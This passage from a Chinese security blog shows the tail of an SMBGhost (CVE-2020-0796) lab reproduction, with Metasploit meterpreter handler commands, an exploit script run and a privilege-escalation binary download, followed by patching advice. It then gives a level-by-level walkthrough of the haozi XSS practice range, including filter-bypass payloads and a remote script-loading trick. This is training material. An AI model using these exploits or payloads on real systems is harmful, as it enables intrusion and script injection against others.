<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605110911519.png" alt="image-20200605110911519"></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动msf配置</span></span><br><span class="line">kali@kali:~$ msfconsole</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> payload windows/x64/meterpreter/bind_tcp <span class="comment">#设置反弹模式</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.174</span><span class="number">.135</span> <span class="comment">#设置目标靶机</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> lport <span class="number">6666</span> <span class="comment">#设置监听端口</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">run</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605111713673.png" alt="image-20200605111713673"></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># 执行<span class="selector-tag">exploit</span><span class="selector-class">.py</span></span><br><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> <span class="selector-tag">-ip</span> 192<span class="selector-class">.168</span><span class="selector-class">.174</span><span class="selector-class">.135</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605122324146.png" alt="image-20200605122324146"></p>
<h5 id="本地提权漏洞复现"><a href="#本地提权漏洞复现" class="headerlink" title="本地提权漏洞复现"></a>本地提权漏洞复现</h5><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">https://github.com/danigargu/CVE<span class="string">-2020</span><span class="string">-0796</span>/releases</span><br><span class="line">下载后直接命令行运行可执行程序（cve<span class="string">-2020</span><span class="string">-0796</span>-local.exe）</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605124404688.png" alt="image-20200605124404688"></p>
<h4 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h4><p>1、更新官方补丁KB4551762或者KB4556799（累计更新补丁包）。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">官方补丁</span><br><span class="line"><span class="number">3</span>月<span class="number">12</span>日更新补丁（KB4551762）：</span><br><span class="line">http<span class="variable">s:</span>//portal.msrc.microsoft.<span class="keyword">com</span>/<span class="keyword">en</span>-US/security-guidance/advisory/CVE-<span class="number">2020</span>-<span class="number">0796</span></span><br><span class="line"> </span><br><span class="line">最新更新补丁（KB4556799）：</span><br><span class="line">http<span class="variable">s:</span>//www.catalog.<span class="keyword">update</span>.microsoft.<span class="keyword">com</span>/Search.aspx?q=KB4556799</span><br></pre></td></tr></table></figure>

<p>2、对SMB通信139/445端口进行封禁。</p>
<p>3、PowerShell命令禁用压缩功能，以阻止未经身份验证的攻击者利用     SMBv3服务器的漏洞。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Set</span>-ItemProperty -<span class="keyword">Path</span> <span class="string">"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> DisableCompression -<span class="keyword">Type</span> DWORD -<span class="keyword">Value</span> <span class="number">1</span> -<span class="keyword">Force</span></span><br></pre></td></tr></table></figure>



<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.cnblogs.com/A66666/p/29635a243378b49ccb485c7a280df989.html" target="_blank" rel="noopener">https://www.cnblogs.com/A66666/p/29635a243378b49ccb485c7a280df989.html</a></p>
<p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</a></p>
<p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
<p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a></p>
<p><a href="https://paper.seebug.org/1164/" target="_blank" rel="noopener">https://paper.seebug.org/1164/</a></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>haozi_XSS靶场通关记录</title>
    <url>/2020/05/11/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>XSS平台：<a href="https://xss.haozi.me/" target="_blank" rel="noopener">https://xss.haozi.me/</a></p>
<p>Github：<a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a></p>
<a id="more"></a>

<h4 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h4><h5 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 常见payload</span></span><br></pre></td></tr></table></figure>

<h5 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;<span class="xml"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">// 在textarea内需闭合textarea标签</span></span><br></pre></td></tr></table></figure>

<h5 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//input code</span></span><br><span class="line"><span class="string">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在value值中需"&gt;进行闭合</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;script&gt;alert<span class="string">`1`</span>&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ g全局匹配，“[()]”替换为空，用``代替</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;img src=x onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// g全局匹配，“[()`]”替换为空,进行实体编码绕过</span></span><br></pre></td></tr></table></figure>

<h5 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">--!&gt;</span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"><span class="comment">// g全局匹配，“--&gt;”替换为😂</span></span><br><span class="line"><span class="comment">// 注释有两种&lt;!-- 注释 --&gt;、&lt;!-- 注释 --!&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">onmousemove</span><br><span class="line">=alert(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ig全局匹配并忽略大小写,正则匹配“auto|on.*=|&gt;”替换为_</span></span><br><span class="line"><span class="comment">// 没有匹配换行可进行换行绕过，插入后需移动鼠标</span></span><br><span class="line"><span class="comment">// onmousemove 鼠标被移动,可参考：https://www.runoob.com/jsref/dom-obj-event.html</span></span><br></pre></td></tr></table></figure>

<h5 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)</span><br><span class="line">     </span><br><span class="line"><span class="comment">// ig全局匹配并忽略大小写，正则匹配"&lt;\/?[^&gt;]+&gt;"替换为空</span></span><br><span class="line"><span class="comment">// 回车自动补全</span></span><br></pre></td></tr></table></figure>

<h5 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;<span class="regexp">/style</span></span><br><span class="line"><span class="regexp">&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=x onerror=alert(1)&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ ig全局匹配并忽略大小写，匹配“&lt;/</span>style&gt;”替换为<span class="comment">/* 坏人 */</span></span><br><span class="line"><span class="comment">// 利用换行绕过匹配</span></span><br></pre></td></tr></table></figure>

<h5 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">http:<span class="comment">//www.segmentfault.com" &gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配输入的是否存在"http://www.segmentfault.com"</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">https:<span class="comment">//www.segmentfault.com@xss.haozi.me/j.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里引入一个靶场自身站点下的js文件（多次尝试无果，最后使用的火狐浏览器）</span></span><br></pre></td></tr></table></figure>

<p>注解：</p>
<p>chrome浏览器因为弃用了一些@嵌入式的一些请求，所以使用了火狐浏览器做这道题。</p>
<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513100657413.png" alt="image-20200513100657413"></p>
<p>自己搭建VPS需支持HTTPS请求否则无法加载js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">https:<span class="comment">//www.segmentfault.com@vps地址/xss.js</span></span><br></pre></td></tr></table></figure>

<p>非要使用HTTP，需在about:config配置文件中将修改security.mixed_content.block_active_content为false，不然会出现混合活动内容</p>
<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513101558581.png" alt="image-20200513101558581"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">http:<span class="comment">//www.segmentfault.com@vps地址/xss.js</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513093911763.png" alt="image-20200513093911763"></p>
<h5 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将输入的字符串转换成大写</span></span><br><span class="line"><span class="comment">// HTML不区分大小写，JavaScript区分大小写；JavaScript是一种区分大小写的语言，对变量方法的命名有严格的大小写敏感。</span></span><br><span class="line"><span class="comment">// js函数进行Unicode编码</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将输入的字符串转换成大写并不区分大小写匹配“script”替换为空</span></span><br><span class="line"><span class="comment">// js函数进行Unicode编码或进行双写绕过</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">			<span class="comment">//这里有个换行</span></span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用换行逃逸注释,利用html的"--&gt;"注释掉后面字符</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;ſcript src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 古英文字符ſ大写后为S（ſ不等于s）</span></span><br><span class="line"><span class="comment">// 脑洞题</span></span><br><span class="line"><span class="comment">// 如果使用加载外部js文件需注意是否区分大小写</span></span><br></pre></td></tr></table></figure>

<h5 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">');alert(1) //</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 浏览器会先解析html,然后再解析js,实体编码了也可以正常解析进行闭合后插入alert,注释后面字符</span></span><br></pre></td></tr></table></figure>

<h5 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//input code</span></span><br><span class="line"><span class="string">""</span>;alert(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭合或传值;再进行插入alert</span></span><br></pre></td></tr></table></figure>

<h5 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// "</span>\/\/<span class="string">"转义在js中还是注释</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)("</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转义后还是",进行闭合前后的内容</span></span><br></pre></td></tr></table></figure>

<p>注解：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)("</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// html</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'javascript:console.log("\");alert(1)(\"")'</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>) <span class="comment">// 创建一个新的元素</span></span><br><span class="line">  a.href = url <span class="comment">//&lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL</span></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a) <span class="comment">// 在节点的子节点列表末添加新的子节点</span></span><br><span class="line">  a.click() <span class="comment">//触发点击事件</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

